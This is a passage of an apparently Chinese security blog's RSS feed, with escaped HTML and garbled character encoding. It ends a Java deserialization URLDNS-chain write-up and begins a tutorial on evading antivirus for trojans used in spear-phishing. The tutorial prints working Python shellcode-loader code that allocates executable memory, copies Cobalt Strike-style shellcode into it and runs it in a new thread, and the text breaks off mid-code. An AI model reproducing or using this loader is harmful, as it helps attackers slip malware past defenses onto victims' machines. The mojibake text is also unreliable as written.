&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…¶å®è·Ÿæˆ‘ä»¬ä¸Šé¢åºåˆ—åŒ–çš„éƒ¨åˆ†æ˜¯å¤§åŒå°å¼‚çš„ï¼Œåªæ˜¯å®ƒæŠŠä¸‹é¢è¿™å¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;field&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1234&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¢æˆäº†ä¸‹é¢è¿™æ®µï¼Œé‡å†™äº†SilentURLStreamHandleræ–¹æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;SilentURLStreamHandler&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;URLStreamHandler&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;kd&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;URLConnection&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;openConnection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IOException&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;kd&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;synchronized&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;InetAddress&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getHostAddress&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;0x03-æ€»ç»“&#34;&gt;0x03 æ€»ç»“&lt;/h1&gt;
&lt;p&gt;æ•´ä¸ªè¿‡ç¨‹å…¶å®å¾ˆç®€å•ï¼Œå› ä¸ºç›¸æ¯”äºCCé“¾æ¥è¯´ç¡®å®æ˜¯éå¸¸ç®€å•çš„ä¸€æ¡é“¾äº†ï¼Œç¬”è€…æ–‡ç¬”ä¸æ˜¯å¾ˆå¥½ï¼Œå¤§å®¶å¦‚æœ‰å»ºè®®å¯ä»¥åœ¨è¯„è®ºåŒºç•™ä¸‹å®è´µçš„æ„è§ã€‚&lt;/p&gt;
&lt;h1 id=&#34;0x04-å‚è€ƒ&#34;&gt;0x04 å‚è€ƒ&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;https://github.com/frohoff/ysoserial&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://yoga7xm.top/2019/08/17/urldns/&#34;&gt;https://yoga7xm.top/2019/08/17/urldns/&lt;/a&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>å…æ€æŠ€æœ¯- Pythonåˆ†ç¦»å…æ€</title>
      <link>https://xxe.icu/python_separation_to_antivirus.html</link>
      <pubDate>Fri, 01 Apr 2022 11:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/python_separation_to_antivirus.html</guid>
      
        <description>&lt;h1 id=&#34;0x00-å‰è¨€&#34;&gt;0x00 å‰è¨€&lt;/h1&gt;
&lt;p&gt;æœ€æ–°å¤ä¹ äº†ä¸€ä¸‹é±¼å‰æ”»å‡»çš„å†…å®¹ï¼Œå‘ç°åœ¨åˆ¶ä½œæœ¨é©¬è¿™ä¸€å—è¿‡ä¸å»äº†ï¼Œå„ç§è¢«æŸ¥æ€ï¼Œäºæ˜¯åˆé‡æ–°å¤ä¹ äº†ä¸€ä¸‹å…æ€è¿™å—çš„å†…å®¹ã€‚&lt;/p&gt;
&lt;p&gt;ç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šæ•™ç¨‹æ–‡ç« ï¼Œè¿˜æ˜¯ä¸é”™çš„ï¼Œæœ¬æ–‡å°†ä½¿ç”¨CSä½œä¸ºä¾‹å­ï¼ŒMSFå…¶å®å·®ä¸å¤šçš„ï¼ŒåºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥å¼€å§‹ï¼&lt;/p&gt;
&lt;h1 id=&#34;0x01-shellcode-loaderåŸç†&#34;&gt;0x01 Shellcode LoaderåŸç†&lt;/h1&gt;
&lt;p&gt;æˆ‘ä»¬åšå…æ€ä¹‹å‰å…ˆäº†è§£ä¸€ä¸‹ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼Œæ¯”å¦‚è¯´shellcodeæ˜¯ä»€ä¹ˆã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;shellcodeæ˜¯ä¸€æ®µç”¨äºåˆ©ç”¨è½¯ä»¶æ¼æ´çš„æœ‰æ•ˆè´Ÿè½½ä»£ç ï¼Œä»¥å…¶ç»å¸¸è®©æ”»å‡»è€…è·å¾—shellè€Œå¾—å&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;shellcode loaderæ˜¯ç”¨æ¥è¿è¡Œshellcodeçš„åŠ è½½å™¨&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;é‚£ä½•ä¸ºåˆ†ç¦»å…æ€å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚è¯´ä½ åœ¨MSFç”Ÿæˆäº†ä¸€ä¸ªexeï¼Œé‚£ä¹ˆå¯æ‰§è¡Œæ–‡ä»¶é‡Œé¢å°±åŒ…å«äº†shellcodeå’Œshellcode loaderã€‚&lt;/p&gt;
&lt;p&gt;å› ä¸ºMSFé»˜è®¤ç”Ÿæˆçš„shellcode loaderæ˜¯ä¸å˜çš„ï¼Œæ˜¯å¾ˆå®¹æ˜“è¢«æ€è½¯è¯†åˆ«å‡ºæ¥çš„ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥æˆ‘ä»¬å°†shellcodeåˆ†ç¦»å‡ºæ¥åšå¤„ç†ï¼Œåˆ†åˆ«å¯¹ä¸¤å—è¿›è¡Œç¼–ç æ··æ·†ã€‚&lt;/p&gt;
&lt;h2 id=&#34;shellcode&#34;&gt;Shellcode&lt;/h2&gt;
&lt;p&gt;æ¯”å¦‚CSç”Ÿæˆçš„ä¸€æ®µpayloadï¼Œbufå°±æ˜¯shellcodeäº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;loaderåŠ è½½å™¨&#34;&gt;loaderåŠ è½½å™¨&lt;/h2&gt;
&lt;p&gt;åŠ è½½å™¨å¯ä»¥ä½¿ç”¨Cã€C#ã€Pythonç­‰æ¥å†™ï¼Œç¬”è€…å°è¯•ç”¨Cæ¥å†™åŠ è½½å™¨çš„æ—¶å€™å‘ç°å¾ˆå®¹æ˜“å°±è¢«æŸ¥æ€äº†ï¼Œæ‰€ä»¥å®è·µäº†Pythonç”Ÿæˆexeå¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œå…æ€ï¼Œæ•ˆæœè¿˜æ˜¯ä¸é”™çš„ã€‚&lt;/p&gt;
&lt;h3 id=&#34;åŠ è½½å™¨åŸç†&#34;&gt;åŠ è½½å™¨åŸç†&lt;/h3&gt;
&lt;p&gt;è¿™éƒ¨åˆ†å°±ä¸åœ¨è¿™é‡Œè¯´äº†ï¼Œå¯ä»¥å‚è€ƒå¤§ä½¬çš„æ–‡ç« &lt;a href=&#34;https://mp.weixin.qq.com/s?__biz=MzIwOTMzMzY0Ng==&amp;amp;mid=2247484538&amp;amp;idx=1&amp;amp;sn=a23fec3cad596102d30a99bad6c27b85&amp;amp;chksm=9774389ba003b18d5428ed6f75490b8cda7f9dcae2e9726ad42ac2d939794c103a7f561f905e&amp;amp;scene=21#wechat_redirect&#34;&gt;CSå…æ€-Shellcode LoaderåŸç†(python)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å¤§å®¶å¯èƒ½ä¼šå‘ç°VirtualAllocå‡½æ•°çš„flAllocationTypeå‚æ•°æœ‰å¤šç§é€‰æ‹©ï¼Œå¯ä»¥å‚è€ƒå¾®è½¯å®˜ç½‘çš„è¯´æ˜ï¼š&lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc&#34;&gt;VirtualAlloc function&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;32ä½å’Œ64ä½é—®é¢˜æŠ¥é”™&#34;&gt;32ä½å’Œ64ä½é—®é¢˜æŠ¥é”™&lt;/h3&gt;
&lt;p&gt;é¦–å…ˆåœ¨è¿™é‡Œè¯´ä¸‹é¢çš„è¿™ä¸ªæŠ¥é”™ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OSError: exception: access violation writing
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;pythonåœ¨ç”³è¯·å†…å­˜çš„æ—¶å€™é»˜è®¤æ˜¯ä½¿ç”¨32ä½çš„ï¼Œç”±äºx86å’Œx64çš„å…¼å®¹æ€§é—®é¢˜å¯¼è‡´äº†å†…å­˜ä¸å¯å†™ã€‚&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚ç³»ç»Ÿæ˜¯64ä½çš„å°±è¦åŠ ä¸Šä¸‹é¢çš„è¯­å¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;restype&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_uint64&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¹¶ä¸”åœ¨&lt;code&gt;RtlMoveMemory&lt;/code&gt;åŠ ä¸Š64ä½çš„ç±»å‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RtlMoveMemory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_uint64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rwxpage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;create_string_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‹é¢æ˜¯ç½‘ä¸Šåˆ†äº«çš„å„ç§åŠ è½½shellcodeçš„ä»£ç ï¼š&lt;/p&gt;
&lt;h3 id=&#34;ç¬¬ä¸€ç§&#34;&gt;ç¬¬ä¸€ç§&lt;/h3&gt;
&lt;p&gt;è¿™ä¸€æ®µè¢«ç”¨çš„å¤ªå¤šäº†ï¼Œå¯¼è‡´åˆšç”Ÿæˆexeå¯æ‰§è¡Œæ–‡ä»¶å°±è¢«å¾®è½¯æŸ¥æ€ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/python&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;ctypes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                          &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                          &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                          &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x40&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;from_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RtlMoveMemory&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ptr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                     &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                     &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ht&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kernel32&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateThread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                         &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                         &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ptr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                         &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                         &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                         &lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pointer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c_int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
